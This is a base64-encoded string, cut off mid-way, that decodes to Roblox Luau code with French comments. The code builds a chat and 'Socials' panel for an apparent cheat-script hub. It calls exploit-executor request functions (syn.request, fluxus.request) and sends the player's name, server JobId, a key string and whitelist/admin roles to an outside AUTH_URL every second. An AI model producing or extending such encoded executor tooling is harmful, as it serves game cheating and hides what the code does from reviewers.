"ICAgbG9jYWwgQ0lDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgQ0lDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNCkgQ0lDb3JuZXIuUGFyZW50ID0gQ2hhdElucHV0CiAgICAKICAgIGxvY2FsIFNlbmRCdG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgCiAgICAtLSBFbnZvaSBhdmVjIGxhIHRvdWNoZSBFbnRyw6llCiAgICBDaGF0SW5wdXQuSW5wdXRFbmRlZDpDb25uZWN0KGZ1bmN0aW9uKGlucHV0KQogICAgICAgIGlmIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLktleWJvYXJkIGFuZCBpbnB1dC5LZXlDb2RlID09IEVudW0uS2V5Q29kZS5SZXR1cm4gdGhlbgogICAgICAgICAgICBsb2NhbCBtc2cgPSBDaGF0SW5wdXQuVGV4dAogICAgICAgICAgICBpZiBtc2cgfj0gIiIgdGhlbgogICAgICAgICAgICAgICAgU2VuZEJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpGaXJlKCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpCiAgICAKICAgIFNlbmRCdG4uU2l6ZSA9IFVEaW0yLm5ldygwLjIzLCAwLCAwLCAyNSkKICAgIFNlbmRCdG4uUG9zaXRpb24gPSBVRGltMi5uZXcoMC43NywgMCwgMSwgLTI1KQogICAgU2VuZEJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ3VycmVudFRoZW1lQ29sb3IKICAgIFNlbmRCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICBTZW5kQnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgU2VuZEJ0bi5UZXh0U2l6ZSA9IDEwCiAgICBTZW5kQnRuLlRleHQgPSAiU0VORCIKICAgIFNlbmRCdG4uUGFyZW50ID0gU29jaWFsc1BhZ2UKICAgIGxvY2FsIFNCQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIFNCQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDQpIFNCQ29ybmVyLlBhcmVudCA9IFNlbmRCdG4KICAgIAogICAgbG9jYWwgUmV0dXJuSHViQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgIFJldHVybkh1YkJ0bi5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDIwKQogICAgUmV0dXJuSHViQnRuLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDEsIDUpIC0tIEp1c3RlIGVuIGRlc3NvdXMgZGUgbCdpbnB1dAogICAgUmV0dXJuSHViQnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig0MCwgNDAsIDUwKQogICAgUmV0dXJuSHViQnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIwMCwgMjAwKQogICAgUmV0dXJuSHViQnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgUmV0dXJuSHViQnRuLlRleHRTaXplID0gMTAKICAgIFJldHVybkh1YkJ0bi5UZXh0ID0gIlJFVFVSTiBUTyBIVUIiCiAgICBSZXR1cm5IdWJCdG4uUGFyZW50ID0gU29jaWFsc1BhZ2UKICAgIGxvY2FsIFJIQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIFJIQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDQpIFJIQ29ybmVyLlBhcmVudCA9IFJldHVybkh1YkJ0bgogICAgCiAgICBsb2NhbCBpc1NvY2lhbHNPcGVuID0gZmFsc2UKICAgIGxvY2FsIHNvY2lhbHNMb29wID0gbmlsCiAgICBsb2NhbCBsYXN0Q2hhdFRpbWUgPSAwIC0tIFBvdXIgZMOpdGVjdGVyIGxlcyBub3V2ZWF1eCBtZXNzYWdlcwogICAgbG9jYWwgcmVwbHlpbmdUbyA9IG5pbCAtLSBWYXJpYWJsZSBwb3VyIHN0b2NrZXIgw6AgcXVpIG9uIHLDqXBvbmQKICAgIAogICAgbG9jYWwgZnVuY3Rpb24gUmVmcmVzaFNvY2lhbHNEYXRhKGZvcmNlVUkpCiAgICAgICAgbG9jYWwgcmVxdWVzdEZ1bmMgPSAoc3luIGFuZCBzeW4ucmVxdWVzdCkgb3IgKGh0dHAgYW5kIGh0dHAucmVxdWVzdCkgb3IgaHR0cF9yZXF1ZXN0IG9yIChmbHV4dXMgYW5kIGZsdXh1cy5yZXF1ZXN0KSBvciByZXF1ZXN0CiAgICAgICAgaWYgcmVxdWVzdEZ1bmMgdGhlbgogICAgICAgICAgICBsb2NhbCBzLCByID0gcGNhbGwoZnVuY3Rpb24oKSAKICAgICAgICAgICAgICAgIHJldHVybiByZXF1ZXN0RnVuYyh7IAogICAgICAgICAgICAgICAgICAgIFVybCA9IEFVVEhfVVJMIC4uICIvc29jaWFscy9kYXRhP3VzZXJuYW1lPSIgLi4gSHR0cFNlcnZpY2U6VXJsRW5jb2RlKHBsYXllci5OYW1lKSAuLiAiJmpvYmlkPSIgLi4gdG9zdHJpbmcoZ2FtZS5Kb2JJZCksIAogICAgICAgICAgICAgICAgICAgIE1ldGhvZCA9ICJHRVQiIAogICAgICAgICAgICAgICAgfSkgCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgaWYgcyBhbmQgciBhbmQgci5TdGF0dXNDb2RlID09IDIwMCB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBkYXRhID0gSHR0cFNlcnZpY2U6SlNPTkRlY29kZShyLkJvZHkpCiAgICAgICAgICAgICAgICBpZiBkYXRhIHRoZW4KICAgICAgICAgICAgICAgICAgICBPbmxpbmVMYWJlbC5UZXh0ID0gIkFjdGl2ZSBVc2VyczogIiAuLiAoZGF0YS5jb3VudCBvciAwKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBpc1NvY2lhbHNPcGVuIGFuZCBub3QgZm9yY2VVSSB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAtLSBVcGRhdGUgVXNlciBMaXN0CiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMoVXNlckxpc3Q6R2V0Q2hpbGRyZW4oKSkgZG8gaWYgdjpJc0EoIkd1aU9iamVjdCIpIHRoZW4gdjpEZXN0cm95KCkgZW5kIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIGRhdGEudXNlcnMgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgdSBpbiBwYWlycyhkYXRhLnVzZXJzKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ0bi5TaXplID0gVURpbTIubmV3KDEsIC0xMCwgMCwgMTUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBidG4uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAwLCAyMDAsIDIwMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnRuLlRleHRTaXplID0gOQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnRuLlRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBidG4uVGV4dCA9ICLigKIgIiAuLiB1CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBidG4uUGFyZW50ID0gVXNlckxpc3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBzLCByID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHJlcXVlc3RGdW5jKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVcmwgPSBBVVRIX1VSTCAuLiAiL3NvY2lhbHMvY2hhdCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTWV0aG9kID0gIlBPU1QiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEhlYWRlcnMgPSB7WyJDb250ZW50LVR5cGUiXSA9ICJhcHBsaWNhdGlvbi9qc29uIn0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQm9keSA9IEh0dHBTZXJ2aWNlOkpTT05FbmNvZGUoewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBrZXkgPSBrZXlTdHJpbmcsIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuYW1lID0gcGxheWVyLk5hbWUsIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZXNzYWdlID0gIlBpbmdlZCB5b3UiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eXBlID0gInBpbmciLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXJnZXQgPSB1CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcyBhbmQgciBhbmQgci5TdGF0dXNDb2RlID09IDIwMCB0aGVuIFNlbmROb3RpZmljYXRpb24oIlBpbmcgc2VudCEiLCAyKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAtLSBVcGRhdGUgQ2hhdAogICAgICAgICAgICAgICAgICAgIC0tIE9uIHbDqXJpZmllIHNpIGxlIGRlcm5pZXIgbWVzc2FnZSBhIGNoYW5nw6kgb3Ugc2kgb24gZm9yY2UgbCd1cGRhdGUKICAgICAgICAgICAgICAgICAgICBsb2NhbCBjdXJyZW50TXNncyA9ICNDaGF0U2Nyb2xsOkdldENoaWxkcmVuKCkgLSAyIC0tIFVJUGFkZGluZyAmIFVJTGlzdExheW91dAogICAgICAgICAgICAgICAgICAgIGxvY2FsIGxhdGVzdE1zZyA9IGRhdGEuY2hhdCBhbmQgZGF0YS5jaGF0WyNkYXRhLmNoYXRdCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgbGF0ZXN0VGltZSA9IGxhdGVzdE1zZyBhbmQgbGF0ZXN0TXNnLnRpbWUgb3IgMAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIGRhdGEuY2hhdCBhbmQgKGxhdGVzdFRpbWUgfj0gbGFzdENoYXRUaW1lIG9yICNkYXRhLmNoYXQgfj0gY3VycmVudE1zZ3Mgb3IgZm9yY2VVSSkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAtLSBOb3RpZmljYXRpb24gTG9naWMgKENoZWNrIGZvciByZXBsaWVzKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBsYXN0Q2hhdFRpbWUgPiAwIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCBtc2cgaW4gcGFpcnMoZGF0YS5jaGF0KSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG1zZy50aW1lID4gbGFzdENoYXRUaW1lIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbXNnLnJlcGx5VG8gYW5kIChtc2cucmVwbHlUbyA9PSBwbGF5ZXIuTmFtZSBvciBtc2cucmVwbHlUbyA9PSBwbGF5ZXIuRGlzcGxheU5hbWUpIGFuZCBtc2cubmFtZSB+PSBwbGF5ZXIuTmFtZSBhbmQgbXNnLm5hbWUgfj0gcGxheWVyLkRpc3BsYXlOYW1lIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNlbmROb3RpZmljYXRpb24obXNnLm5hbWUgLi4gIiBhbnN3ZXJlZCB5b3UiLCA1KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG1zZy50eXBlID09ICJwaW5nIiBhbmQgbXNnLnRhcmdldCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBteUVudHJ5ID0gKHBsYXllci5EaXNwbGF5TmFtZSBvciBwbGF5ZXIuTmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5Jc1doaXRlbGlzdGVkIHRoZW4gbXlFbnRyeSA9ICJbV0xdICIgLi4gbXlFbnRyeSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG1zZy50YXJnZXQgPT0gbXlFbnRyeSBhbmQgbXNnLm5hbWUgfj0gcGxheWVyLk5hbWUgYW5kIG1zZy5uYW1lIH49IHBsYXllci5EaXNwbGF5TmFtZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2VuZE5vdGlmaWNhdGlvbihtc2cubmFtZSAuLiAiIHBpbmdlZCB5b3UiLCA1KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgbGFzdENoYXRUaW1lID0gbGF0ZXN0VGltZQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyhDaGF0U2Nyb2xsOkdldENoaWxkcmVuKCkpIGRvIGlmIHY6SXNBKCJGcmFtZSIpIHRoZW4gdjpEZXN0cm95KCkgZW5kIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgbXNnIGluIHBhaXJzKGRhdGEuY2hhdCkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBtc2cudHlwZSBvciBtc2cudHlwZSA9PSAiY2hhdCIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgbXNnRnJhbWUgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1zZ0ZyYW1lLkF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbXNnRnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygxLCAtMTAsIDAsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtc2dGcmFtZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbXNnRnJhbWUuUGFyZW50ID0gQ2hhdFNjcm9sbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLSBDbGljayB0byBSZXBseSAoSW52aXNpYmxlIEJ1dHRvbiBjb3ZlcmluZyB0aGUgbWVzc2FnZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHJlcGx5QnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGx5QnRuLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMSwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGx5QnRuLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBseUJ0bi5UZXh0ID0gIiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGx5QnRuLlBhcmVudCA9IG1zZ0ZyYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBseUJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBseWluZ1RvID0gbXNnLm5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDaGF0SW5wdXQuUGxhY2Vob2xkZXJUZXh0ID0gIlJlcGx5aW5nIHRvICIgLi4gbXNnLm5hbWUgLi4gIi4uLiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDaGF0SW5wdXQ6Q2FwdHVyZUZvY3VzKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgbmFtZUxibCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWVMYmwuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAxMikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWVMYmwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWVMYmwuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBuYW1lTGJsLlRleHRTaXplID0gOQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbmFtZUxibC5UZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGltZVN0ciA9IG1zZy50aW1lIGFuZCBvcy5kYXRlKCJbJUg6JU1dICIsIG1hdGguZmxvb3IobXNnLnRpbWUgLyAxMDAwKSkgb3IgIiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHJvbGVUZXh0ID0gIiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG1zZy5yb2xlID09ICJXTCIgb3IgbXNnLnJvbGUgPT0gIldMLUFEIiB0aGVuIHJvbGVUZXh0ID0gIiBbV0xdIiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG1zZy5yb2xlID09ICJBRCIgb3IgbXNnLnJvbGUgPT0gIldMLUFEIiB0aGVuIHJvbGVUZXh0ID0gcm9sZVRleHQgLi4gIiBbQURdIiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWVMYmwuVGV4dCA9IHRpbWVTdHIgLi4gbXNnLm5hbWUgLi4gcm9sZVRleHQgLi4gIjoiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBuYW1lTGJsLlRleHRDb2xvcjMgPSAobXNnLnJvbGUgPT0gIldMIiBvciBtc2cucm9sZSA9PSAiV0wtQUQiKSBhbmQgQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkgb3IgKG1zZy5yb2xlID09ICJBRCIgYW5kIENvbG9yMy5mcm9tUkdCKDI1NSwgMjAwLCAwKSBvciBDdXJyZW50VGhlbWVDb2xvcikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWVMYmwuUGFyZW50ID0gbXNnRnJhbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgY29udGVudExibCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRlbnRMYmwuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGVudExibC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAwLCAwLCAxMikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRlbnRMYmwuQXV0b21hdGljU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5ZCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250ZW50TGJsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250ZW50TGJsLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250ZW50TGJsLlRleHRTaXplID0gOQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGVudExibC5UZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGVudExibC5UZXh0V3JhcHBlZCA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRlbnRMYmwuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIzMCwgMjMwLCAyMzApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250ZW50TGJsLlRleHQgPSBtc2cubXNnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250ZW50TGJsLlBhcmVudCA9IG1zZ0ZyYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpIC0tIEF0dGVuZHJlIGxlIHJlbmR1CiAgICAgICAgICAgICAgICAgICAgICAgIENoYXRTY3JvbGwuQ2FudmFzUG9zaXRpb24gPSBWZWN0b3IyLm5ldygwLCA5ZTkpIC0tIEZvcmNlIGxlIHNjcm9sbCB0b3V0IGVuIGJhcwogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIC0tIEJhY2tncm91bmQgU29jaWFsIExvb3AgKEFsd2F5cyBhY3RpdmUgdG8ga2VlcCBjb3VudCB1cGRhdGVkKQogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgQ29uZmlnLklzUnVubmluZyBkbwogICAgICAgICAgICBSZWZyZXNoU29jaWFsc0RhdGEoaXNTb2NpYWxzT3BlbikKICAgICAgICAgICAgdGFzay53YWl0KDEpIC0tIEF1dG8tcmVmcmVzaCBldmVyeSAxIHNlY29uZAogICAgICAgIGVuZAogICAgZW5kKQogICAgCiAgICBTb2NpYWxzQnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgIEh1Yk1lbnUuVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgUmlnaHRUYWJDb250YWluZXIuVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgUmlnaHRQYWdlQ29udGFpbmVyLlZpc2libGUgPSBmYWxzZQogICAgICAgIFBhdGNoTm90ZXNQYWdlLlZpc2libGUgPSBmYWxzZQogICAgICAgIFNvY2lhbHNQYWdlLlZpc2libGUgPSB0cnVlCiAgICAgICAgUmlnaHRUaXRsZS5UZXh0ID0gIlNPQ0lBTFMiCiAgICAgICAgQmFja0J0bi5WaXNpYmxlID0gdHJ1ZQogICAgICAgIGlzU29jaWFsc09wZW4gPSB0cnVlCiAgICAgICAgUmVmcmVzaFNvY2lhbHNEYXRhKHRydWUpCiAgICBlbmQpCiAgICAKICAgIFNlbmRCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgbXNnID0gQ2hhdElucHV0LlRleHQKICAgICAgICBpZiBtc2cgPT0gIiIgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgQ2hhdElucHV0LlRleHQgPSAiIgogICAgICAgIAogICAgICAgIGxvY2FsIGN1cnJlbnRSZXBseSA9IHJlcGx5aW5nVG8KICAgICAgICByZXBseWluZ1RvID0gbmlsCiAgICAgICAgQ2hhdElucHV0LlBsYWNlaG9sZGVyVGV4dCA9ICJNZXNzYWdlLi4uIgoKICAgICAgICBsb2NhbCByZXF1ZXN0RnVuYyA9IChzeW4gYW5kIHN5bi5yZXF1ZXN0KSBvciAoaHR0cCBhbmQgaHR0cC5yZXF1ZXN0KSBvciBodHRwX3JlcXVlc3Qgb3IgKGZsdXh1cyBhbmQgZmx1eHVzLnJlcXVlc3QpIG9yIHJlcXVlc3QKICAgICAgICBpZiByZXF1ZXN0RnVuYyBhbmQga2V5U3RyaW5nIHRoZW4KICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBsb2NhbCBzLCByID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIHJldHVybiByZXF1ZXN0RnVuYyh7CiAgICAgICAgICAgICAgICAgICAgICAgIFVybCA9IEFVVEhfVVJMIC4uICIvc29jaWFscy9jaGF0IiwKICAgICAgICAgICAgICAgICAgICAgICAgTWV0aG9kID0gIlBPU1QiLAogICAgICAgICAgICAgICAgICAgICAgICBIZWFkZXJzID0ge1siQ29udGVudC1UeXBlIl0gPSAiYXBwbGljYXRpb24vanNvbiJ9LAogICAgICAgICAgICAgICAgICAgICAgICAgQm9keSA9IEh0dHBTZXJ2aWNlOkpTT05FbmNvZGUoewogICAgICAgICAgICAgICAgICAgICAgICAgICAga2V5ID0ga2V5U3RyaW5nLCAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSBwbGF5ZXIuTmFtZSwgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZXNzYWdlID0gbXNnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgcm9sZSA9IChDb25maWcuSXNXaGl0ZWxpc3RlZCBhbmQgIldMIiBvciAiIikgLi4gKENvbmZpZy5Jc0FkbWluIGFuZCAiQUQiIG9yICIiKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGx5VG8gPSBjdXJyZW50UmVwbHkKICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgaWYgcyBhbmQgciBhbmQgci5TdGF0dXNDb2RlID09IDIwMCB0aGVuIAogICAgICAgICAgICAgICAgICAgIFNlbmROb3RpZmljYXRpb24oIk1lc3NhZ2UgU2VudCEiLCAxKSAKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBTZW5kTm90aWZpY2F0aW9uKCJGYWlsZWQgdG8gc2VuZCBtZXNzYWdlIiwgMikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICAgICAgICAgIFJlZnJlc2hTb2NpYWxzRGF0YSh0cnVlKQogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICBlbmQpCgogICAgUmVmcmVzaEJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBSZWZyZXNoQnRuLlRleHQgPSAi4o+zIExPQURJTkcu" .. "Li4iCiAgICAgICAgUmVmcmVzaEJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNjAsIDYwLCA5MCkKICAgICAgICAKICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgUmVmcmVzaFNvY2lhbHNEYXRhKHRydWUpCiAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgICAgICAKICAgICAgICAgICAgUmVmcmVzaEJ0bi5UZXh0ID0gIvCflIQgUkVGUkVTSCIKICAgICAgICAgICAgUmVmcmVzaEJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNTAsIDUwLCA3MCkKICAgICAgICBlbmQpCiAgICBlbmQpCgogICAgUGF0Y2hOb3Rlc0J0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBpZiBQYXRjaE5vdGVzUGFnZS5WaXNpYmxlIHRoZW4KICAgICAgICAgICAgSHViTWVudS5WaXN